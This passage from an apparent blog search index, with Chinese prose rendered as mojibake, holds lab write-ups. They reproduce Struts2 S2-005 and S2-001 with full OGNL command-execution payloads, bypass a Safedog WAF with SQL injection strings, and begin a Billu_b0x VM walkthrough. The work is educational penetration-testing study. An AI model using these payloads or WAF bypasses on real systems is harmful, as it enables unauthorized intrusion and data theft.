æŠŠä»¥å‰çš„infoæ–‡ä»¶å¤¹é‡æ–°æ”¹å›å</span><br></pre></td></tr></table></figure>

<br>

<p><code>Reference</code></p>
<blockquote>
</blockquote>
]]></content>
      <categories>
        <category>apt-get</category>
      </categories>
      <tags>
        <tag>apt-get</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2å¤ç°s2-005</title>
    <url>/posts/9e0365e7/</url>
    <content><![CDATA[<h3 id="S2-005å¤ç°"><a href="#S2-005å¤ç°" class="headerlink" title="S2-005å¤ç°"></a>S2-005å¤ç°</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ä¿®å¤S2-003æ—¶å­˜åœ¨ç»•è¿‡ï¼ŒS2-003å¯¹# è¿‡æ»¤æ—¶å¿½ç•¥äº†Unicodeç¼–ç ï¼Œå¯ä»¥ä½¿ç”¨\u0023æˆ–è€…å…«è¿›åˆ¶è¿›è¡Œç»•è¿‡</p>
<br>
####  ç¯å¢ƒå‡†å¤‡

<p><code>docker-compose up -d</code></p>
<h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><h4 id="åŸå§‹POC"><a href="#åŸå§‹POC" class="headerlink" title="åŸå§‹POC"></a>åŸå§‹POC</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;\u0023_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(vaaa)&#x3D;true</span><br><span class="line">&amp;(aaaa)((&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003d\u0023vccc&#39;)(\u0023vccc\u003dnew java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&amp;(asdf)((&#39;\u0023rt.exec(&quot;calc&quot;)&#39;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))&#x3D;1</span><br></pre></td></tr></table></figure>
<p>è§£ç å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;#_memberAccess[\&#39;allowStaticMethodAccess\&#39;]&#39;)(vaaa)&#x3D;true</span><br><span class="line">&#x2F;&#x2F;è®¾ç½®allowStaticMethodAccessä¸ºtrueï¼Œå¼€å¯åå°±å¯ä»¥æ‰§è¡Œé™æ€æ–¹æ³• (vaaa)ä¸ºéµå¾ªognlè¯­æ³•æ ‘è§„åˆ™</span><br><span class="line">&amp;(aaaa)((&#39;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]&#x3D;#vccc&#39;)(#vccc&#x3D;new java.lang.Boolean(&quot;false&quot;)))</span><br><span class="line">&#x2F;&#x2F;è®¾ç½®denyMethodExecutionä¸ºfalse å…è®¸ognlè‡ªå®šä¹‰å˜é‡</span><br><span class="line">&amp;(asdf)((&#39;#rt.exec(&quot;calc&quot;)&#39;)(#rt&#x3D;@java.lang.Runtime@getRuntime()))&#x3D;1</span><br><span class="line">&#x2F;&#x2F;æ‰§è¡Œ calc ç³»ç»Ÿå‘½ä»¤</span><br></pre></td></tr></table></figure>
<p>whoami POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%27%5c43_memberAccess.allowStaticMethodAccess%27)(a)&#x3D;true</span><br><span class="line">&amp;(b)((%27%5c43context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5c75false%27)(b))</span><br><span class="line">&amp;(%27%5c43c%27)((%27%5c43_memberAccess.excludeProperties%5c75@java.util.Collections@EMPTY_SET%27)(c))</span><br><span class="line">&amp;(g)((%27%5c43mycmd%5c75%5c%27whoami%5c%27%27)(d))</span><br><span class="line">&amp;(h)((%27%5c43myret%5c75@java.lang.Runtime@getRuntime().exec(%5c43mycmd)%27)(d))&amp;(i)((%27%5c43mydat%5c75new%5c40java.io.DataInputStream(%5c43myret.getInputStream())%27)(d))&amp;(j)((%27%5c43myres%5c75new%5c40byte[51020]%27)(d))&amp;(k)((%27%5c43mydat.readFully(%5c43myres)%27)(d))&amp;(l)((%27%5c43mystr%5c75new%5c40java.lang.String(%5c43myres)%27)(d))&amp;(m)((%27%5c43myout%5c75@org.apache.struts2.ServletActionContext@getResponse()%27)(d))&amp;(n)((%27%5c43myout.getWriter().println(%5c43mystr)%27)(d))</span><br></pre></td></tr></table></figure>
<h4 id="å…³é—­ç¯å¢ƒ"><a href="#å…³é—­ç¯å¢ƒ" class="headerlink" title="å…³é—­ç¯å¢ƒ"></a>å…³é—­ç¯å¢ƒ</h4><p><code>docker-compose down -v</code></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://b1ue.cn/archives/107.html">http://b1ue.cn/archives/107.html</a></p>
<p><a href="https://xz.aliyun.com/t/7966#toc-0">https://xz.aliyun.com/t/7966#toc-0</a></p>
<p><a href="https://blog.csdn.net/u011721501/article/details/41626959">https://blog.csdn.net/u011721501/article/details/41626959</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Struts2å¤ç°s2-001</title>
    <url>/posts/996ea1fe/</url>
    <content><![CDATA[<h3 id="S2-001å¤ç°"><a href="#S2-001å¤ç°" class="headerlink" title="S2-001å¤ç°"></a>S2-001å¤ç°</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>ç”¨æˆ·æäº¤è¡¨å•æ•°æ®éªŒè¯å¤±è´¥åï¼Œåç«¯ä¼šä½¿ç”¨OGNLè¡¨è¾¾å¼%{value}å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè§£æ,ä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ</p>
<h4 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h4><p><code>cd s2-001</code></p>
<p><code>docker-compose build</code></p>
<p><code>docker-compose up -d</code></p>
<p><code>docekr ps</code>æŸ¥çœ‹æ˜¯å¦å¯åŠ¨æˆåŠŸ</p>
<h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><p>è®¿é—®192.168.159.128:8080</p>
<p><img src="/posts/996ea1fe/001-1.PNG"></p>
<p>è¾“å…¥<code>%&#123;1+23&#125;</code>å¾—åˆ°ç»“æœä¸º24 å¯ä»¥åˆ¤æ–­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p><img src="/posts/996ea1fe/001-2.PNG"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;pwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
<p>å°†<code>pwd</code>æ¢æˆå¯¹åº”å‘½ä»¤å³å¯æ‰§è¡Œ</p>
<br>

<p>è·å–webè·¯å¾„POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line"></span><br><span class="line">#response&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line"></span><br><span class="line">#response.println(#req.getRealPath(&#39;&#x2F;&#39;)),</span><br><span class="line"></span><br><span class="line">#response.flush(),</span><br><span class="line"></span><br><span class="line">#response.close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-3.PNG"></p>
<p>æŸ¥çœ‹æƒé™whoami POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],</span><br><span class="line"></span><br><span class="line">#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-4.PNG"></p>
<p><code>cat /etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"></span><br><span class="line">#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line"></span><br><span class="line">#b&#x3D;#a.getInputStream(),</span><br><span class="line"></span><br><span class="line">#c&#x3D;new java.io.InputStreamReader(#b),</span><br><span class="line"></span><br><span class="line">#d&#x3D;new java.io.BufferedReader(#c),</span><br><span class="line"></span><br><span class="line">#e&#x3D;new char[50000],#d.read(#e),</span><br><span class="line"></span><br><span class="line">#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line"></span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line"></span><br><span class="line">#f.getWriter().close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/996ea1fe/001-5.PNG"></p>
<h4 id="å…³é—­ç¯å¢ƒ"><a href="#å…³é—­ç¯å¢ƒ" class="headerlink" title="å…³é—­ç¯å¢ƒ"></a>å…³é—­ç¯å¢ƒ</h4><p><code>docker-compose down -v</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p> <a href="https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/">https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/</a></p>
<p><a href="https://xz.aliyun.com/t/2672#toc-0">https://xz.aliyun.com/t/2672#toc-0</a></p>
<p><a href="https://www.freebuf.com/vuls/246768.html">https://www.freebuf.com/vuls/246768.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoè®¾ç½®å¤šä¸ªæ ‡ç­¾æˆ–åˆ†ç±»</title>
    <url>/posts/d7c641b4/</url>
    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰å…¨ç‹—4.0 sqliç»•è¿‡</title>
    <url>/posts/d405928/</url>
    <content><![CDATA[<h4 id="and-1-1-ç»•è¿‡"><a href="#and-1-1-ç»•è¿‡" class="headerlink" title="and 1=1 ç»•è¿‡"></a>and 1=1 ç»•è¿‡</h4><p><img src="/posts/d405928/1.png"></p>
<p>æ­£å¸¸ä½¿ç”¨ <code>?id=tom&#39; and 1=1 --+</code>ä¼šè¢«æ‹¦æˆª<br><img src="/posts/d405928/2.png"></p>
<h5 id="ä½¿ç”¨-amp-amp-æ›¿æ¢and"><a href="#ä½¿ç”¨-amp-amp-æ›¿æ¢and" class="headerlink" title="ä½¿ç”¨&amp;&amp;æ›¿æ¢and"></a>ä½¿ç”¨<code>&amp;&amp;</code>æ›¿æ¢and</h5><p><img src="/posts/d405928/3.png"><br>æ— æ³•ç»•è¿‡</p>
<h5 id="ä½¿ç”¨å†…è”æ³¨é‡Š-ï¼11440"><a href="#ä½¿ç”¨å†…è”æ³¨é‡Š-ï¼11440" class="headerlink" title="ä½¿ç”¨å†…è”æ³¨é‡Š/*ï¼11440 */"></a>ä½¿ç”¨å†…è”æ³¨é‡Š<code>/*ï¼11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
<p><img src="/posts/d405928/8.png"><br>å¯ä»¥ç»•è¿‡<br><br></p>
<h5 id="ç»§ç»­ä½¿ç”¨and"><a href="#ç»§ç»­ä½¿ç”¨and" class="headerlink" title="ç»§ç»­ä½¿ç”¨and"></a>ç»§ç»­ä½¿ç”¨and</h5><p>and 0x1</p>
<p>å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<br>
##### httpå‚æ•°æ±¡æŸ“

<p><img src="/posts/d405928/14.png"><br><br></p>
<hr>
<br>

<br>

<h4 id="order-byç»•è¿‡"><a href="#order-byç»•è¿‡" class="headerlink" title="order byç»•è¿‡"></a>order byç»•è¿‡</h4><h5 id="ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡"><a href="#ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡" class="headerlink" title="ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡"></a>ä½¿ç”¨æ¢è¡Œç¬¦å’Œæ³¨é‡Šç»•è¿‡</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
<h5 id="ä½¿ç”¨httpå‚æ•°æ±¡æŸ“"><a href="#ä½¿ç”¨httpå‚æ•°æ±¡æŸ“" class="headerlink" title="ä½¿ç”¨httpå‚æ•°æ±¡æŸ“"></a>ä½¿ç”¨httpå‚æ•°æ±¡æŸ“</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
<br>

<hr>
<h4 id="union-select-ç»•è¿‡"><a href="#union-select-ç»•è¿‡" class="headerlink" title="union select ç»•è¿‡"></a>union select ç»•è¿‡</h4><h5 id="å†…è”æ³¨å…¥"><a href="#å†…è”æ³¨å…¥" class="headerlink" title="å†…è”æ³¨å…¥"></a>å†…è”æ³¨å…¥</h5><p>å°è¯•ä½¿ç”¨<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
<p>fuzzè·‘äº†ä¸‹10000-99999éƒ½æ— æ³•ç»•è¿‡</p>
<p><img src="/posts/d405928/5.png"></p>
<br>

<h5 id="æ¢è¡Œç¬¦-æ³¨é‡Š"><a href="#æ¢è¡Œç¬¦-æ³¨é‡Š" class="headerlink" title="æ¢è¡Œç¬¦+æ³¨é‡Š"></a>æ¢è¡Œç¬¦+æ³¨é‡Š</h5><p><img src="/posts/d405928/9.png"></p>
<p>æ— æ³•ç»•è¿‡</p>
<br>

<h5 id="å†…è”æ³¨é‡Š-æ¢è¡Œç¬¦"><a href="#å†…è”æ³¨é‡Š-æ¢è¡Œç¬¦" class="headerlink" title="å†…è”æ³¨é‡Š+æ¢è¡Œç¬¦"></a>å†…è”æ³¨é‡Š+æ¢è¡Œç¬¦</h5><p><img src="/posts/d405928/10.png"></p>
<p><code>tom%27/**/union/*!Â§10440Â§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
<p>fuzzä¸€ä¸‹ï¼Œå‘ç°91625ä»¥åçš„éƒ½å¯ä»¥ç»•è¿‡</p>
<p><img src="/posts/d405928/11.png"></p>
<p><img src="/posts/d405928/12.png"></p>
<h5 id="httpå‚æ•°æ±¡æŸ“"><a href="#httpå‚æ•°æ±¡æŸ“" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
<p><img src="http3.png"></p>
<p><img src="http4.png"></p>
<br>

<hr>
<h5 id="database-ã€user-ç»•è¿‡"><a href="#database-ã€user-ç»•è¿‡" class="headerlink" title="database()ã€user()ç»•è¿‡"></a>database()ã€user()ç»•è¿‡</h5><p><code>databse/*!91624*/()`` </code>user/!<em>99999</em>/()``</p>
<br>

<p>è¿™é‡Œä¹Ÿå¯ä»¥é€šè¿‡å†…è”æ³¨é‡Š ä¸­é—´æ•°å­—æ²¡è¯• éšä¾¿è¾“å…¥äº†å‡ ä¸ª</p>
<p><img src="/posts/d405928/13.png"></p>
<br>

<hr>
<h4 id="information-schemaç»•è¿‡"><a href="#information-schemaç»•è¿‡" class="headerlink" title="information_schemaç»•è¿‡"></a>information_schemaç»•è¿‡</h4><h5 id="ä½¿ç”¨å†…è”æ³¨é‡Š-fuzz"><a href="#ä½¿ç”¨å†…è”æ³¨é‡Š-fuzz" class="headerlink" title="ä½¿ç”¨å†…è”æ³¨é‡Š+fuzz"></a>ä½¿ç”¨å†…è”æ³¨é‡Š+fuzz</h5><p>æ²¡ç»•è¿‡</p>
<h5 id="åˆ©ç”¨httpå‚æ•°æ±¡æŸ“"><a href="#åˆ©ç”¨httpå‚æ•°æ±¡æŸ“" class="headerlink" title="åˆ©ç”¨httpå‚æ•°æ±¡æŸ“"></a>åˆ©ç”¨httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),user()%23*/</code></p>
<p><img src="http5.png"></p>
<br>

<hr>
<h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><h5 id="å†…è”æ³¨é‡Š-fuzz"><a href="#å†…è”æ³¨é‡Š-fuzz" class="headerlink" title="å†…è”æ³¨é‡Š+fuzz"></a>å†…è”æ³¨é‡Š+fuzz</h5><p>updatexml</p>
<p>æ— wafæƒ…å†µä¸‹</p>
<p><img src="/posts/d405928/baocuo1.png"></p>
<p>å¼€å¯å®‰å…¨ç‹—</p>
<p><img src="/posts/d405928/baocuo2.png"></p>
<p>updataxml()ä¼šè¢«æ‹¦æˆªï¼Œä¸­é—´åŠ å†…è”æ³¨é‡Šå¯ä»¥ç»•è¿‡</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo3.png"></p>
<p>ä½†æ˜¯</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>ä¼šè¢«æ‹¦æˆª</p>
<p>æµ‹è¯•äº†ä¸‹ <code>select from ...</code> åé¢åŠ ä¸œè¥¿å°±ä¼šè¢«æ‹¦æˆª</p>
<p>åœ¨from åé¢æ·»åŠ  <code>%23%0a</code>å¯ä»¥ç»•è¿‡</p>
<p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
<p><img src="/posts/d405928/baocuo4.png"></p>
<br>

<h5 id="httpå‚æ•°æ±¡æŸ“-1"><a href="#httpå‚æ•°æ±¡æŸ“-1" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
<p><img src="http6.png"></p>
<p><img src="http7.png"></p>
<br>

<hr>
<h4 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h4><h5 id="httpå‚æ•°æ±¡æŸ“-2"><a href="#httpå‚æ•°æ±¡æŸ“-2" class="headerlink" title="httpå‚æ•°æ±¡æŸ“"></a>httpå‚æ•°æ±¡æŸ“</h5><p><img src="http_sleep.png"></p>
<p><img src="/posts/d405928/bool1.png"> </p>
<p><img src="/posts/d405928/bool2.png"></p>
<br>

<br>

<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>åœ¨æ­¤ç‰ˆæœ¬çš„å®‰å…¨ç‹—(4.0.23.13)ä¸­ï¼Œåˆ©ç”¨<strong>httpå‚æ•°æ±¡æŸ“</strong>éƒ½å¯ä»¥ç»•è¿‡</p>
<p>æœ‰äº›ä¹Ÿå¯ä»¥ä½¿ç”¨<strong>å†…è”æ³¨é‡Š</strong>+<strong>fuzz</strong>+<strong>æ¢è¡Œç¬¦</strong>è¿›è¡Œç»•è¿‡</p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs1</title>
    <url>/posts/685229a3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Billu_b0x</title>
    <url>/posts/827ecdf7/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.144</p>
</blockquote>
<h4 id="nmapæ‰«ç½‘æ®µ"><a href="#nmapæ‰«ç½‘æ®µ" class="headerlink" title="nmapæ‰«ç½‘æ®µ"></a>nmapæ‰«ç½‘æ®µ</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
<blockquote>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
</blockquote>
<h4 id="nmapæ‰«ç«¯å£"><a href="#nmapæ‰«ç«¯å£" class="headerlink" title="nmapæ‰«ç«¯å£"></a>nmapæ‰«ç«¯å£</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£</p>
<h4 id="dirsearchæ‰«æç›®å½•"><a href="#dirsearchæ‰«æç›®å½•" class="headerlink" title="dirsearchæ‰«æç›®å½•"></a>dirsearchæ‰«æç›®å½•</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
<blockquote>
<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
</blockquote>
<p>æ‰«å‡º</p>
<p><code>add.php</code>     æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/posts/827ecdf7/add.png"></p>
<p><code>head.php</code> è²Œä¼¼æ²¡å•¥ä¸œè¥¿ å°±ä¸€èƒŒæ™¯å›¾</p>
<p><img src="/posts/827ecdf7/head.png"></p>
<p><code>test.php</code> æ–‡ä»¶åŒ…å«</p>
<p><img src="/posts/827ecdf7/test.png"></p>
<p><code>phpmy</code>        phpmyadminç™»å½•é¡µé¢</p>
<p><img src="/posts/827ecdf7/phpmy.png"></p>
<p><code>in</code>            phpinfo()</p>
<p><img src="/posts/827ecdf7/phpinfo.png"></p>
<blockquote>
<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysqlç‰ˆæœ¬ä¸º5.5.38</p>
</blockquote>
<h4 id="ç”¨dirbæ‰«æç›®å½•"><a href="#ç”¨dirbæ‰«æç›®å½•" class="headerlink" title="ç”¨dirbæ‰«æç›®å½•"></a>ç”¨dirbæ‰«æç›®å½•</h4><blockquote>
<p> â€”- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> â€”-</p>
<ul>
<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
</ul>
</blockquote>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>è¿›å…¥ä¸»é¡µï¼Œæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶æç¤ºsqlæ³¨å…¥</p>
<p><img src="/posts/827ecdf7/index.png"></p>
<p>å°è¯•ä¸‹sqlæ³¨å…¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
<p>æ²¡æ‰«å‡ºæ¥æ³¨å…¥ç‚¹</p>
<br>

